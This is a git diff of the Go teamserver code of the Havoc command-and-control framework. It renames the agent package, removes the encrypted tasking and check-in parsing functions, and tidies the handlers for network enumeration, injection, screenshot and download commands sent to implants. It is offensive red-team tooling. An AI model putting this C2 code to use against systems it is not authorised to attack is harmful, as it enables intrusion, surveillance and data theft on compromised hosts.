@@ -1,9 +1,7 @@
-package demons
+package agent
 
 import (
-	"Havoc/pkg/colors"
 	"Havoc/pkg/common"
-	"Havoc/pkg/common/crypt"
 	"Havoc/pkg/common/parser"
 	"Havoc/pkg/logger"
 	"Havoc/pkg/logr"
@@ -11,7 +9,6 @@ import (
 	"Havoc/pkg/win32"
 	"bytes"
 	"encoding/base64"
-	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
@@ -21,451 +18,8 @@ import (
 	"strings"
 	"time"
 
-	"github.com/fatih/structs"
 	"github.com/olekukonko/tablewriter"
 )
-
-func BuildPayloadMessage(Jobs []DemonJob, AesKey []byte, AesIv []byte) []byte {
-	var (
-		PayloadPackage     = []byte{}
-		PayloadPackageSize = make([]byte, 4)
-
-		DataCommandID = make([]byte, 4)
-		DataTaskID    = make([]byte, 4)
-
-		DataPayload []byte
-	)
-
-	for _, job := range Jobs {
-		for i := range job.Data {
-			switch job.Data[i].(type) {
-			case int64:
-				var xUint32 = make([]byte, 4)
-				binary.LittleEndian.PutUint32(xUint32, uint32(job.Data[i].(int64)))
-				DataPayload = append(DataPayload, xUint32...)
-
-			case int32:
-				var xUint32 = make([]byte, 4)
-				binary.LittleEndian.PutUint32(xUint32, uint32(job.Data[i].(int32)))
-				DataPayload = append(DataPayload, xUint32...)
-
-			case int:
-				var xUint32 = make([]byte, 4)
-				binary.LittleEndian.PutUint32(xUint32, uint32(job.Data[i].(int)))
-				DataPayload = append(DataPayload, xUint32...)
-
-			case uint32:
-				var xUint32 = make([]byte, 4)
-				binary.LittleEndian.PutUint32(xUint32, job.Data[i].(uint32))
-				DataPayload = append(DataPayload, xUint32...)
-
-			case string:
-				// Getting size of input and set size of DataPayload
-				var size = make([]byte, 4)
-				binary.LittleEndian.PutUint32(size, uint32(len(job.Data[i].(string))))
-				DataPayload = append(DataPayload, size...)
-				// append input DataPayload to buffer
-				DataPayload = append(DataPayload, []byte(job.Data[i].(string))...)
-
-			case []byte:
-				// Getting size of input and set size of DataPayload
-				var size = make([]byte, 4)
-				binary.LittleEndian.PutUint32(size, uint32(len(job.Data[i].([]byte))))
-				DataPayload = append(DataPayload, size...)
-				// append input DataPayload to buffer
-				DataPayload = append(DataPayload, job.Data[i].([]byte)...)
-
-			}
-		}
-
-		binary.LittleEndian.PutUint32(DataCommandID, job.Command)
-		binary.LittleEndian.PutUint32(DataTaskID, job.TaskID)
-		binary.LittleEndian.PutUint32(PayloadPackageSize, uint32(len(DataPayload)))
-
-		PayloadPackage = append(PayloadPackage, DataCommandID...)
-		PayloadPackage = append(PayloadPackage, DataTaskID...)
-		PayloadPackage = append(PayloadPackage, PayloadPackageSize...)
-
-		if len(DataPayload) > 0 {
-			DataPayload = crypt.XCryptBytesAES256(DataPayload, AesKey, AesIv)
-			PayloadPackage = append(PayloadPackage, DataPayload...)
-		}
-	}
-
-	return PayloadPackage
-}
-
-func AgentParseHeader(data []byte) (AgentHeader, error) {
-	var Header = AgentHeader{}
-	var Parser = parser.NewParser(data)
-
-	if Parser.Length() > 4 {
-		Header.Size = Parser.ParseInt32()
-	} else {
-		return Header, errors.New("failed to parse package size")
-	}
-
-	if Parser.Length() > 4 {
-		Header.MagicValue = Parser.ParseInt32()
-	} else {
-		return Header, errors.New("failed to parse magic value")
-	}
-
-	if Parser.Length() > 4 {
-		Header.AgentID = Parser.ParseInt32()
-	} else {
-		return Header, errors.New("failed to parse agent id")
-	}
-
-	Header.Data = Parser
-
-	logger.Debug(fmt.Sprintf("Header Size       : %d", Header.Size))
-	logger.Debug(fmt.Sprintf("Header MagicValue : %x", Header.MagicValue))
-	logger.Debug(fmt.Sprintf("Header AgentID    : %x", Header.AgentID))
-	logger.Debug(fmt.Sprintf("Header Data       : \n%v", hex.Dump(Header.Data.Buffer())))
-
-	return Header, nil
-}
-
-func LogDemonCallback(agent *Agent) {
-	logger.Info("Agent " +
-		colors.Red(agent.NameID) +
-		" authenticated as " + colors.BoldBlue(agent.Info.Hostname+"\\"+agent.Info.Username) + " ::" +
-		" [Process: " + colors.Red(agent.Info.ProcessName+"\\"+strconv.Itoa(agent.Info.ProcessPID)) + "]",
-	)
-}
-
-func AgentRegisterInfoToInstance(Header AgentHeader, RegisterInfo map[string]any) *Agent {
-	var agent = &Agent{
-		Active:     false,
-		SessionDir: "",
-
-		Info: new(AgentInfo),
-	}
-	var err error
-
-	agent.NameID = fmt.Sprintf("%x", Header.AgentID)
-	agent.Info.MagicValue = Header.MagicValue
-
-	if val, ok := RegisterInfo["Hostname"]; ok {
-		agent.Info.Hostname = val.(string)
-	}
-
-	if val, ok := RegisterInfo["Username"]; ok {
-		agent.Info.Username = val.(string)
-	}
-
-	if val, ok := RegisterInfo["Domain"]; ok {
-		agent.Info.DomainName = val.(string)
-	}
-
-	if val, ok := RegisterInfo["InternalIP"]; ok {
-		agent.Info.InternalIP = val.(string)
-	}
-
-	if val, ok := RegisterInfo["Process Path"]; ok {
-		agent.Info.ProcessPath = val.(string)
-	}
-
-	if val, ok := RegisterInfo["Process Name"]; ok {
-		agent.Info.ProcessName = val.(string)
-	}
-
-	if val, ok := RegisterInfo["Process Arch"]; ok {
-		agent.Info.ProcessArch = val.(string)
-	}
-
-	if val, ok := RegisterInfo["Process ID"]; ok {
-		agent.Info.ProcessPID, err = strconv.Atoi(val.(string))
-		if err != nil {
-			logger.Debug("Couldn't parse ProcessID integer from string: " + err.Error())
-			agent.Info.ProcessPID = 0
-		}
-	}
-
-	if val, ok := RegisterInfo["Process Parent ID"]; ok {
-		agent.Info.ProcessPPID, err = strconv.Atoi(val.(string))
-		if err != nil {
-			logger.Debug("Couldn't parse ProcessPPID integer from string: " + err.Error())
-			agent.Info.ProcessPPID = 0
-		}
-	}
-
-	if val, ok := RegisterInfo["Process Elevated"]; ok {
-		agent.Info.Elevated = "false"
-		if val == "1" {
-			agent.Info.Elevated = "true"
-		}
-	}
-
-	if val, ok := RegisterInfo["OS Version"]; ok {
-		agent.Info.OSVersion = val.(string)
-	}
-
-	if val, ok := RegisterInfo["OS Build"]; ok {
-		agent.Info.OSBuild = val.(string)
-	}
-
-	if val, ok := RegisterInfo["OS Arch"]; ok {
-		agent.Info.OSArch = val.(string)
-	}
-
-	agent.Info.FirstCallIn = time.Now().Format("02/01/2006 15:04:05")
-	agent.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
-
-	return agent
-}
-
-func AgentParseResponse(AgentID int, Parser *parser.Parser) *Agent {
-	logger.Debug("Response:\n" + hex.Dump(Parser.Buffer()))
-
-	var (
-		MagicValue  int
-		DemonID     int
-		Hostname    string
-		DomainName  string
-		Username    string
-		InternalIP  string
-		ProcessName string
-		ProcessPID  int
-		OsVersion   []int
-		OsArch      int
-		Elevated    int
-		ProcessArch int
-		ProcessPPID int
-		SleepDelay  int
-		AesKeyEmpty = make([]byte, 32)
-	)
-
-	/*
-		[ SIZE         ] 4 bytes
-		[ Magic Value  ] 4 bytes
-		[ Agent ID     ] 4 bytes
-		[ COMMAND ID   ] 4 bytes
-		[ AES KEY      ] 32 bytes
-		[ AES IV       ] 16 bytes
-		AES Encrypted {
-			[ Agent ID     ] 4 bytes // <-- this is needed to check if we successfully decrypted the data
-			[ User Name    ] size + bytes
-			[ Host Name    ] size + bytes
-			[ Domain       ] size + bytes
-			[ IP Address   ] 16 bytes?
-			[ Process Name ] size + bytes
-			[ Process ID   ] 4 bytes
-			[ Parent  PID  ] 4 bytes
-			[ Process Arch ] 4 bytes
-			[ Elevated     ] 4 bytes
-			[ OS Info      ] ( 5 * 4 ) bytes
-			[ OS Arch      ] 4 bytes
-			..... more
-		}
-	*/
-
-	var Session = &Agent{
-		Encryption: struct {
-			AESKey []byte
-			AESIv  []byte
-		}{
-			AESKey: Parser.ParseAtLeastBytes(32),
-			AESIv:  Parser.ParseAtLeastBytes(16),
-		},
-
-		Active:     false,
-		SessionDir: "",
-
-		Info: new(AgentInfo),
-	}
-
-	logger.Debug("AES KEY\n" + hex.Dump(Session.Encryption.AESKey))
-	logger.Debug("AES IV :\n" + hex.Dump(Session.Encryption.AESIv))
-
-	logger.Debug("Buffer:\n" + hex.Dump(Parser.Buffer()))
-	if bytes.Compare(Session.Encryption.AESKey, AesKeyEmpty) != 0 {
-		Parser.DecryptBuffer(Session.Encryption.AESKey, Session.Encryption.AESIv)
-	}
-	logger.Debug("After Dec:\n" + hex.Dump(Parser.Buffer()))
-
-	// TODO: error handling. check if there is enough in the Parser to parse -> avoid crashing or invalid sessions
-
-	DemonID = Parser.ParseInt32()
-	logger.Debug(fmt.Sprintf("Parsed DemonID: %x", DemonID))
-
-	if AgentID != DemonID {
-		if AgentID != 0 {
-			logger.Debug("Failed to decrypt agent init request")
-			return nil
-		}
-	} else {
-		logger.Debug(fmt.Sprintf("AgentID (%x) == DemonID (%x)\n", AgentID, DemonID))
-	}
-
-	if Parser.Length() >= 4 {
-		Hostname = string(Parser.ParseBytes())
-	} else {
-		logger.Debug("Failed to parse agent request")
-		return nil
-	}
-
-	if Parser.Length() >= 4 {
-		Username = string(Parser.ParseBytes())
-	} else {
-		logger.Debug("Failed to parse agent request")
-		return nil
-	}
-
-	if Parser.Length() >= 4 {
-		DomainName = string(Parser.ParseBytes())
-	} else {
-		logger.Debug("Failed to parse agent request")
-		return nil
-	}
-
-	if Parser.Length() >= 4 {
-		InternalIP = string(Parser.ParseBytes())
-	} else {
-		logger.Debug("Failed to parse agent request")
-		return nil
-	}
-
-	logger.Debug(fmt.Sprintf(
-		"\n"+
-			"Hostname: %v\n"+
-			"Username: %v\n"+
-			"Domain  : %v\n"+
-			"InternIP: %v\n",
-		Hostname, Username, DomainName, InternalIP))
-
-	ProcessName = string(Parser.ParseBytes())
-	ProcessPID = Parser.ParseInt32()
-	ProcessPPID = Parser.ParseInt32()
-	ProcessArch = Parser.ParseInt32()
-	Elevated = Parser.ParseInt32()
-
-	logger.Debug(fmt.Sprintf(
-		"\n"+
-			"ProcessName: %v\n"+
-			"ProcessPID : %v\n"+
-			"ProcessPPID: %v\n"+
-			"ProcessArch: %v\n"+
-			"Elevated   : %v\n",
-		ProcessName, ProcessPID, ProcessPPID, ProcessArch, Elevated))
-
-	OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
-	OsArch = Parser.ParseInt32()
-	SleepDelay = Parser.ParseInt32()
-
-	Session.Active = true
-
-	Session.NameID = fmt.Sprintf("%x", DemonID)
-	Session.Info.MagicValue = MagicValue
-	Session.Info.FirstCallIn = time.Now().Format("02/01/2006 15:04:05")
-	Session.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
-	Session.Info.Hostname = Hostname
-	Session.Info.DomainName = DomainName
-	Session.Info.Username = Username
-	Session.Info.InternalIP = InternalIP
-	Session.Info.SleepDelay = SleepDelay
-
-	// Session.Info.ExternalIP 	= strings.Split(connection.RemoteAddr().String(), ":")[0]
-	// Session.Info.Listener 	= t.Name
-
-	switch ProcessArch {
-
-	case PROCESS_ARCH_UNKNOWN:
-		Session.Info.ProcessArch = "Unknown"
-		break
-
-	case PROCESS_ARCH_X64:
-		Session.Info.ProcessArch = "x64"
-		break
-
-	case PROCESS_ARCH_X86:
-		Session.Info.ProcessArch = "x86"
-		break
-
-	case PROCESS_ARCH_IA64:
-		Session.Info.ProcessArch = "IA64"
-		break
-
-	default:
-		Session.Info.ProcessArch = "Unknown"
-		break
-
-	}
-
-	// update this (use from meterpreter)
-	if OsVersion[0] == 10 && OsVersion[1] >= 0 && OsVersion[2] != 0x0000001 && OsVersion[4] == 21996 {
-		Session.Info.OSVersion = "Windows 11 Server"
-	} else if OsVersion[0] == 10 && OsVersion[1] >= 0 && OsVersion[2] == 0x0000001 && OsVersion[4] == 21996 {
-		Session.Info.OSVersion = "Windows 11"
-	} else if OsVersion[0] == 10 && OsVersion[1] >= 0 && OsVersion[2] != 0x0000001 {
-		Session.Info.OSVersion = "Windows 10 Server"
-	} else if OsVersion[0] == 10 && OsVersion[1] >= 0 && OsVersion[2] == 0x0000001 {
-		Session.Info.OSVersion = "Windows 10"
-	} else if OsVersion[0] == 6 && OsVersion[1] >= 3 && OsVersion[2] != 0x0000001 {
-		Session.Info.OSVersion = "Windows Server 2012 R2"
-	} else if OsVersion[0] == 6 && OsVersion[1] >= 3 && OsVersion[2] == 0x0000001 {
-		Session.Info.OSVersion = "Windows 8.1"
-	} else if OsVersion[0] == 6 && OsVersion[1] >= 2 && OsVersion[2] != 0x0000001 {
-		Session.Info.OSVersion = "Windows Server 2012"
-	} else if OsVersion[0] == 6 && OsVersion[1] >= 2 && OsVersion[2] == 0x0000001 {
-		Session.Info.OSVersion = "Windows 8"
-	} else if OsVersion[0] == 6 && OsVersion[1] >= 1 && OsVersion[2] != 0x0000001 {
-		Session.Info.OSVersion = "Windows Server 2008 R2"
-	} else if OsVersion[0] == 6 && OsVersion[1] >= 1 && OsVersion[2] == 0x0000001 {
-		Session.Info.OSVersion = "Windows 7"
-	} else if OsVersion[0] < 5 {
-		Session.Info.OSVersion = "unknown"
-	}
-
-	if OsVersion[3] != 0 {
-		Session.Info.OSVersion = Session.Info.OSVersion + " Service Pack " + strconv.Itoa(OsVersion[3])
-	}
-
-	switch OsArch {
-	case 0:
-		Session.Info.OSArch = "x86"
-	case 9:
-		Session.Info.OSArch = "x64/AMD64"
-	case 5:
-		Session.Info.OSArch = "ARM"
-	case 12:
-		Session.Info.OSArch = "ARM64"
-	case 6:
-		Session.Info.OSArch = "Itanium-based"
-	default:
-		Session.Info.OSArch = "Unknown (" + strconv.Itoa(OsArch) + ")"
-	}
-
-	Session.Info.Elevated = "false"
-	if Elevated == 1 {
-		Session.Info.Elevated = "true"
-	}
-
-	process := strings.Split(ProcessName, "\\")
-
-	Session.Info.ProcessName = process[len(process)-1]
-	Session.Info.ProcessPID = ProcessPID
-	Session.Info.ProcessPPID = ProcessPPID
-	Session.Info.ProcessPath = ProcessName
-
-	logger.Debug("Finished parsing demon")
-
-	return Session
-}
-
-func (demon *Agent) AddJobToQueue(job DemonJob) []DemonJob {
-	demon.JobQueue = append(demon.JobQueue, job)
-	return demon.JobQueue
-}
-
-func (demon *Agent) GetQueuedJobs() []DemonJob {
-	var Jobs = demon.JobQueue
-
-	demon.JobQueue = nil
-
-	return Jobs
-}
 
 func TaskPrepare(TaskID string, Command int, Info any) (DemonJob, error) {
 	var taskID, err = strconv.ParseInt(TaskID, 16, 32)
@@ -1400,9 +954,25 @@ func TaskPrepare(TaskID string, Command int, Info any) (DemonJob, error) {
 
 	case COMMAND_NET:
 		var (
-			NetCommand, _ = strconv.Atoi(Optional["NetCommand"].(string))
-			Param         = Optional["Param"].(string)
+			NetCommand int
+			Param      string
 		)
+
+		if val, ok := Optional["NetCommand"]; ok {
+			NetCommand, err = strconv.Atoi(val.(string))
+			if err != nil {
+				logger.Debug("Failed to parse net command: " + err.Error())
+				return DemonJob{}, err
+			}
+		} else {
+			return DemonJob{}, errors.New("command::net NetCommand not defined")
+		}
+
+		if val, ok := Optional["Param"]; ok {
+			Param = val.(string)
+		} else {
+			return DemonJob{}, errors.New("command::net param not defined")
+		}
 
 		switch NetCommand {
 		case DEMON_NET_COMMAND_DOMAIN:
@@ -1412,58 +982,66 @@ func TaskPrepare(TaskID string, Command int, Info any) (DemonJob, error) {
 			break
 
 		case DEMON_NET_COMMAND_LOGONS:
+			var Target = common.EncodeUTF16(Param)
 			job.Data = []interface{}{
 				NetCommand,
-				Param,
+				Target,
 			}
 			break
 
 		case DEMON_NET_COMMAND_SESSIONS:
+			var Target = common.EncodeUTF16(Param)
 			job.Data = []interface{}{
 				NetCommand,
-				Param,
+				Target,
 			}
 			break
 
 		case DEMON_NET_COMMAND_COMPUTER:
+			var Target = common.EncodeUTF16(Param)
 			job.Data = []interface{}{
 				NetCommand,
+				Target,
 			}
 			break
 
 		case DEMON_NET_COMMAND_DCLIST:
+			var Target = common.EncodeUTF16(Param)
 			job.Data = []interface{}{
 				NetCommand,
+				Target,
 			}
 			break
 
 		case DEMON_NET_COMMAND_SHARE:
-			var Domain = common.EncodeUTF16(Param)
+			var Target = common.EncodeUTF16(Param)
 			job.Data = []interface{}{
 				NetCommand,
-				Domain,
+				Target,
 			}
 			break
 
 		case DEMON_NET_COMMAND_LOCALGROUP:
-			var Server = common.EncodeUTF16(Param)
+			var Target = common.EncodeUTF16(Param)
 			job.Data = []interface{}{
 				NetCommand,
-				Server,
+				Target,
 			}
 			break
 
 		case DEMON_NET_COMMAND_GROUP:
-			var Server = common.EncodeUTF16(Param)
+			var Target = common.EncodeUTF16(Param)
 			job.Data = []interface{}{
 				NetCommand,
-				Server,
+				Target,
 			}
 			break
 
 		case DEMON_NET_COMMAND_USERS:
+			var Target = common.EncodeUTF16(Param)
 			job.Data = []interface{}{
 				NetCommand,
+				Target,
 			}
 			break
 
@@ -1530,10 +1108,10 @@ func TaskPrepare(TaskID string, Command int, Info any) (DemonJob, error) {
 	return job, nil
 }
 
-func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs RoutineFunc) {
-	Parser.DecryptBuffer(demon.Encryption.AESKey, demon.Encryption.AESIv)
+func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs RoutineFunc) {
+	Parser.DecryptBuffer(a.Encryption.AESKey, a.Encryption.AESIv)
 
-	demon.UpdateLastCallback(Funcs)
+	a.UpdateLastCallback(Funcs)
 
 	switch CommandID {
 
@@ -1555,10 +1133,10 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 				Message["Message"] = "Agent has been tasked to cleanup and exit process. cya..."
 			}
 
-			demon.Active = false
-			Funcs.EventAgentMark(demon.NameID, "Dead")
+			a.Active = false
+			Funcs.EventAgentMark(a.NameID, "Dead")
 
-			Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 		}
 
 	case COMMAND_CHECKIN:
@@ -1647,8 +1225,8 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 
 			Session.NameID = fmt.Sprintf("%x", DemonID)
 			Session.Info.MagicValue = MagicValue
-			Session.Info.FirstCallIn = demon.Info.FirstCallIn
-			Session.Info.LastCallIn = demon.Info.LastCallIn
+			Session.Info.FirstCallIn = a.Info.FirstCallIn
+			Session.Info.LastCallIn = a.Info.LastCallIn
 			Session.Info.Hostname = Hostname
 			Session.Info.DomainName = DomainName
 			Session.Info.Username = Username
@@ -1811,7 +1389,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 		}
 
 	SendMessage:
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -1884,18 +1462,18 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			break
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 		break
 
 	case COMMAND_SLEEP:
 		var Output = make(map[string]string)
 
-		demon.Info.SleepDelay = Parser.ParseInt32()
+		a.Info.SleepDelay = Parser.ParseInt32()
 
 		Output["Type"] = "Good"
-		Output["Message"] = fmt.Sprintf("Set sleep interval to %v seconds", demon.Info.SleepDelay)
+		Output["Message"] = fmt.Sprintf("Set sleep interval to %v seconds", a.Info.SleepDelay)
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 		break
 
@@ -2006,7 +1584,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 				break
 			}
 
-			Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 			break
 		}
 
@@ -2119,7 +1697,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 				Output["Type"] = "Info"
 				Output["Message"] = fmt.Sprintf("Downloaded file: %v (%v)", string(FileName), len(FileContent))
 
-				logr.LogrInstance.DemonAddDownloadedFile(demon.NameID, string(FileName), FileContent)
+				logr.LogrInstance.DemonAddDownloadedFile(a.NameID, string(FileName), FileContent)
 
 				// TODO: instead of sending it directly to the client. get it from the Agent Download folder.
 				Output["MiscType"] = "download"
@@ -2205,7 +1783,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			}
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 		break
 
@@ -2289,7 +1867,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			Output["MiscData"] = base64.StdEncoding.EncodeToString(ProcessListJson)
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 	case COMMAND_OUTPUT:
 		var Output = make(map[string]string)
@@ -2298,7 +1876,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 		Output["Output"] = string(Parser.ParseBytes())
 		Output["Message"] = fmt.Sprintf("Received Output [%v bytes]:", len(Output["Output"]))
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 
 	case COMMAND_INJECT_DLL:
 		var (
@@ -2319,7 +1897,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			Message["Message"] = "Failed to inject reflective dll: " + String
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2337,7 +1915,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			Message["Message"] = "Failed to inject shellcode"
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2569,7 +2147,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2582,7 +2160,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 		switch Type {
 		case 0x0:
 			OutputMap["Output"] = string(Parser.ParseBytes())
-			Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 
 			break
 
@@ -2592,7 +2170,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			OutputMap["Type"] = "Good"
 			OutputMap["Message"] = string(String)
 
-			Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 			break
 
 		case 0x91:
@@ -2601,7 +2179,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			OutputMap["Type"] = "Info"
 			OutputMap["Message"] = string(String)
 
-			Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 			break
 
 		case 0x92:
@@ -2610,7 +2188,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			OutputMap["Type"] = "Error"
 			OutputMap["Message"] = string(String)
 
-			Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 			break
 
 		case 0x98:
@@ -2622,7 +2200,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			OutputMap["Type"] = "Error"
 			OutputMap["Message"] = fmt.Sprintf("Exception %v [%x] accured while executing BOF at address %x", win32.StatusToString(int64(Exception)), Exception, Address)
 
-			Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 			break
 
 		case 0x99:
@@ -2632,7 +2210,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			OutputMap["Type"] = "Error"
 			OutputMap["Message"] = "Symbol not found: " + LibAndFunc
 
-			Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
+			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, OutputMap)
 
 			break
 
@@ -2681,7 +2259,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			}
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 	case COMMAND_ASSEMBLY_INLINE_EXECUTE:
 		var (
@@ -2717,7 +2295,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			break
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2733,7 +2311,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 		Message["Message"] = "List available assembly versions:"
 		Message["Output"] = Output
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2746,7 +2324,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 		Message["Type"] = typeGood
 		Message["Message"] = "Changed parent pid to spoof: " + strconv.Itoa(Ppid)
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -2967,7 +2545,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 				break
 			}
 
-			Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+			Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
 		}
 		break
 
@@ -3051,7 +2629,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			Message["Message"] = "Error while setting certain config"
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -3065,7 +2643,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			var BmpBytes = Parser.ParseBytes()
 			var Name = "Desktop_" + time.Now().Format("02.01.2006-05.04.05") + ".png"
 
-			logr.LogrInstance.DemonSaveScreenshot(demon.NameID, Name, BmpBytes)
+			logr.LogrInstance.DemonSaveScreenshot(a.NameID, Name, BmpBytes)
 
 			Message["Type"] = "Good"
 			Message["Message"] = "Successful took screenshot"
@@ -3075,7 +2653,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			Message["MiscData2"] = Name
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 		break
 
 	case COMMAND_NET:
@@ -3288,7 +2866,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 			break
 		}
 
-		Funcs.DemonOutput(demon.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
@@ -3350,8 +2928,8 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 							var DemonInfo = AgentParseResponse(AgentHdr.AgentID, AgentHdr.Data)
 
 							if DemonInfo != nil {
-								DemonInfo.Pivots.Parent = demon
-								demon.Pivots.Links = append(demon.Pivots.Links, DemonInfo)
+								DemonInfo.Pivots.Parent = a
+								a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
 								DemonInfo.Info.MagicValue = AgentHdr.MagicValue
 
 								LogDemonCallback(DemonInfo)
